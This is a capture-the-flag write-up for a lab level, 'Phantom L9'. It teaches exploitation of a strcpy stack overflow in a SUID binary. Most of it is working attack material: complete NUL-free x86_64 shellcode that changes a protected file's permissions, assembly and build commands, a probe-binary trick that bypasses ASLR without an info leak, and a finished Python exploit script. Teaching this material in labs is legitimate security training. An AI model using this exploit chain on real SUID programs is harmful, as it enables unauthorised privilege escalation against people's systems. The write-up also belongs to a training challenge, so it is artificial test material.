---
slug: phantom-l9
track: phantom
level: 9
title: "Phantom L9 — Stack Day"
difficulty: senior
prereq_levels: [phantom-8]
estimated_time: "3-6 hours"
prerequisites:
  - C calling convention (x86_64)
  - Stack layout (saved RBP, saved RIP)
  - Linux syscall ABI
  - GDB basic usage
  - Familiarity with strcpy / null-terminator behavior
---

# Phantom L9 — Stack Day

> **Spoiler gate.** This writeup assumes you've cleared Phantom L8 and are
> actively stuck on L9. It walks the full technique with concrete commands,
> but masks the final flag value so you still execute the chain yourself.

## What this level teaches

Four things that are easy in isolation but hard together:

1. Classic **stack buffer overflow** in a SUID binary.
2. **NUL-free shellcode** authoring (because the vulnerable copy is
   `strcpy`, which stops at the first zero byte).
3. **ASLR bypass** for a stack-resident payload — without leaks.
4. The **SUID euid-drop trap** — your `execve("/bin/sh")` will silently
   drop privileges. You must reach the flag *without* spawning a shell.

If you bounce off L9 with frustration, it's almost always because you
solved (1)+(2) but tripped on (4). Reading this writeup doesn't trivialize
the level — you still need to compile shellcode, time the probe, and
land the exploit. It just unblocks the conceptual lock.

---

## Inspect what you have

You're logged in as `phantom9`. The level artefact is a SUID binary at a
known path. The flag is owned by a different user (`flagkeeperN`) that
you can't `su` to.

```bash
$ id
uid=1009(phantom9) gid=1009(phantom9) groups=1009(phantom9)

$ ls -la /usr/local/bin/kern-tool
-rwsr-x--- 1 flagkeeper9 phantom9 16352 ... /usr/local/bin/kern-tool
```

The mode `4750 flagkeeper9:phantom9` matters:

- `4` (SUID bit) → when *you* execute it, your effective UID becomes
  `flagkeeper9`.
- `750 flagkeeper9:phantom9` → only owner + members of group `phantom9`
  can `r-x` it. You qualify (`phantom9` is in the `phantom9` group).

The flag is in a directory that is traversable but the file itself is
`mode 600 flagkeeper9:flagkeeper9` — readable only by `flagkeeper9`.

So the chain is: trigger code execution inside `kern-tool`, where your
effective UID is `flagkeeper9`, and use that window to either read or
expose the flag file.

---

## Step 1 — find the overflow

The binary takes a single argv:

```bash
$ /usr/local/bin/kern-tool foo
[kern-tool] checking module 'foo'
not found

$ /usr/local/bin/kern-tool $(python3 -c 'print("A"*100)')
Segmentation fault (core dumped)
```

Crashing on a long argument confirms a stack overflow. Find the offset
to saved RIP. You can do it by hand (read the source if you have it,
count `buffer` size + saved RBP) or use a cyclic pattern under GDB.

Concrete shape (canonical stack layout for a 64-byte buffer):

```
buffer[0..63]    ← writable scratch
buffer[64..71]   ← saved RBP
buffer[72..79]   ← saved RIP   ← we want to overwrite this
```

Verification under GDB:

```
(gdb) run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"B"*8)')
Program received signal SIGSEGV
0x4242424242424242 in ?? ()
```

`rip = 0x4242...` ⇒ overflow at offset 72 confirmed.

---

## Step 2 — recognize the SUID trap

Your instinct from any BO tutorial: drop a shellcode that does
`execve("/bin/sh", ...)`. This will *not* work here, and the failure
mode is subtle:

When `bash` (or `dash`) starts and detects that **real UID ≠ effective
UID**, it assumes it was accidentally invoked by a SUID program and
immediately drops the effective UID back to the real UID for safety.
On this level:

- `ruid = phantom9` (you, the invoker)
- `euid = flagkeeper9` (the SUID bit raised it)

bash's `getuid() != geteuid()` check trips → it calls `setuid(getuid())`
→ you're back to `phantom9` inside the shell → flag file is `600
flagkeeper9` → permission denied.

Two ways past this:

1. **Re-align UIDs before exec** — call `setreuid(euid, euid)` first to
   make ruid = euid = flagkeeper9, then execve the shell. The shell no
   longer detects a SUID escape.
2. **Skip the shell entirely** — use direct syscalls (`open`, `read`,
   `write`, `chmod`) inside the shellcode. No bash, no euid drop, no
   wasted bytes on `/bin/sh`. This is what we'll do.

Choosing path (2) makes the shellcode shorter and removes a runtime
dependency.

---

## Step 3 — write NUL-free shellcode

The vulnerability is `strcpy(buffer, argv[1])`. `strcpy` stops at the
first `\x00`, so **every byte of your payload must be non-zero**.

The strategy: instead of reading the flag (which requires a tmp buffer
to hold the bytes and another syscall to print them), `chmod` the flag
file `0o644` from inside the SUID context. After the binary exits, you
read the now-world-readable flag as `phantom9`.

Pseudocode of the syscall:

```c
chmod("/var/lib/phantom-flags/level9_flag", 0644);
exit(0);
```

The asm idioms you need to keep NUL-free:

| Naive | Why it fails | NUL-free replacement |
|---|---|---|
| `mov eax, 90` | `mov` of small imm32 has zero high bytes | `push 90; pop rax` |
| `mov rsi, 0x1a4` | same | `push 0x010101a4; pop rsi` (kernel masks high bits to 0o644) |
| `mov [rdi+34], 0` | imm contains 0 | `xor eax,eax; mov [rdi+34], al` |
| `string\0` literal | embedded NUL | strip NUL, write it at runtime via `mov [rdi+len], al` |

A complete shellcode (intel syntax, ~68 bytes):

```asm
.intel_syntax noprefix
.global _start
_start:
    jmp code
path:
    .ascii "/var/lib/phantom-flags/level9_flag"   /* no NUL terminator */
code:
    lea  rdi, [rip + path]                /* rdi = &path */
    xor  eax, eax
    mov  byte ptr [rdi + 34], al          /* terminate path at runtime */
    push 0x010101a4
    pop  rsi                              /* mode = 0o644 (low 12 bits) */
    push 90                               /* SYS_chmod */
    pop  rax
    syscall
    xor  edi, edi
    push 60                               /* SYS_exit */
    pop  rax
    syscall
```

Build:

```bash
as -o sc.o sc.S
ld --oformat binary -o /tmp/sc.bin sc.o
test 0 -eq "$(grep -c $'\x00' /tmp/sc.bin)" && echo "NUL-free OK"
wc -c /tmp/sc.bin   # → ~68
```

---

## Step 4 — bypass ASLR without an info leak

ASLR is on. Stack base address changes per execution. You cannot just
hardcode an address.

**The trick:** when the kernel `execve`s a binary, it lays out
`argv[]` and `envp[]` strings near the top of the stack. The exact
address of `argv[1]` is a deterministic function of:

- length of `argv[0]` (the binary path)
- number of argv/envp entries
- total length of all argv/envp strings combined
- alignment

If you build a small **probe binary** that:

- has the **same `argv[0]` length** as the target (`/usr/local/bin/kern-tool`
  is 24 chars — match it via a 24-char symlink to your probe),
- is invoked with an **`argv[1]` of the same length** as your real payload,
- runs in the **same shell session** (so envp is identical),

then `argv[1]`'s runtime address in the probe equals `argv[1]`'s runtime
address in the real `kern-tool` invocation.

Probe binary:

```c
#include <stdio.h>
int main(int argc, char **argv) {
    printf("%p\n", argv[1]);
    return 0;
}
```

```bash
$ gcc -no-pie -o /tmp/_probe /tmp/_probe.c

# 24-char symlink to match kern-tool's argv[0] length exactly
$ ln -s /tmp/_probe /tmp/_ker_tool_probe_abc

# Invoke with arg of the same length as your future payload (78 bytes)
$ /tmp/_ker_tool_probe_abc $(python3 -c 'print("A"*78)')
0x7fff5b8a9d20
```

That printed address is `argv[1]`'s location in the probe, *and* in the
real kern-tool run if you keep the same envp.

---

## Step 5 — assemble the payload

Layout target:

```
offset    content                     bytes
0..67     shellcode                   68
68..71    NOP padding (\x90)          4    ← brings us to offset 72
72..77    low-6 bytes of argv1 addr   6
78        (strcpy writes \0 here)     1
```

Why the low-6 trick works: x86_64 user-space addresses are bounded
above by `0x0000_7fff_ffff_ffff`. The top two bytes are always `\x00`.
`strcpy` copies your 78-byte payload then writes its own NUL at offset
78 — that NUL lands inside the saved-RIP slot at byte 6, completing
the address. Byte 7 was already zero from the previous frame.

Result: saved RIP = `0x0000_<argv1_addr_low_6>` → which is exactly
`argv1_addr` (because the high two bytes were already zero) → CPU
returns into your shellcode.

```python
import struct, subprocess, os

PAYLOAD_LEN = 78

with open("/tmp/sc.bin","rb") as f:
    sc = f.read()
assert b"\x00" not in sc

probe_path = "/tmp/_ker_tool_probe_abc"   # 24-char to match kern-tool length
addr = int(subprocess.check_output(
    [probe_path, b"A"*PAYLOAD_LEN]
).decode().strip(), 16)

pad = b"\x90" * (72 - len(sc))
rip_low6 = struct.pack("<Q", addr)[:6]
payload = sc + pad + rip_low6
assert len(payload) == PAYLOAD_LEN
assert b"\x00" not in payload

subprocess.run(["/usr/local/bin/kern-tool", payload], timeout=10)
```

---

## Step 6 — read the flag

After the exploit runs, the file is `0o644`:

```bash
$ ls -la /var/lib/phantom-flags/level9_flag
-rw-r--r-- 1 flagkeeper9 flagkeeper9 ... level9_flag

$ cat /var/lib/phantom-flags/level9_flag
<your-level-9-flag>
```

Submit it on the platform.

---

## Common dead-ends

- **You wrote a working shellcode but flag still unreadable.** You're
  almost certainly using `execve("/bin/sh", ...)`. Re-read Step 2 — bash
  drops your euid. Switch to direct syscalls (`chmod` or `setreuid +
  open/read/write`).
- **strcpy truncates your payload.** A NUL slipped into your shellcode
  (rebuild and `grep -c $'\x00'`), or `argv[1]` low-6 happens to contain
  a zero byte (rare; re-roll by tweaking PAYLOAD_LEN by 1 to shift the
  address).
- **SIGSEGV after return.** Probe address doesn't match the real run.
  The probe must use the **same** argv[0] length, **same** payload-arg
  length, and **same** environment. Run probe and exploit
  back-to-back from the same shell with no `export` in between.
- **ASLR seems "off" but exploit still fails.** Some setups disable
  stack ASLR but keep `mmap` ASLR; argv lives on the stack so it's still
  rerandomized per exec. The probe technique handles both cases.
- **shellcode runs but `chmod` returns -EPERM.** Path is wrong; check
  the embedded string and the runtime NUL terminator offset.

---

## Why this level is hard

L9 stacks four senior-pwn skills:

1. Classic stack BO — easy.
2. NUL-free shellcode — most generators (msfvenom, etc.) emit zeros.
3. ASLR bypass without an info-leak — non-obvious, requires the
   probe-binary technique.
4. SUID euid-drop trap — every BO tutorial ends with `execve("/bin/sh")`,
   so the natural reflex breaks here.

Each is documented somewhere on the internet. Stacking them is what
forces you to reason from first principles instead of running a CTF
template.

---

## Further reading

- *Smashing the Stack for Fun and Profit* — Aleph One (Phrack 49)
  (the canonical BO tutorial; outdated specifics, useful mental model)
- `man 2 execve` — note the SUID/euid behavior near the bottom of the
  rationale section
- `man 7 capabilities` and `bash(1) PRIVILEGED MODE` — read why bash
  re-aligns UIDs on startup
- Linux x86_64 syscall numbers: `/usr/include/asm/unistd_64.h`
- ASLR internals — Yves Younan, *25 Years of Vulnerabilities* (2013)

---

*Submit feedback on this writeup or your own approach in `#writeups` on
Discord.*
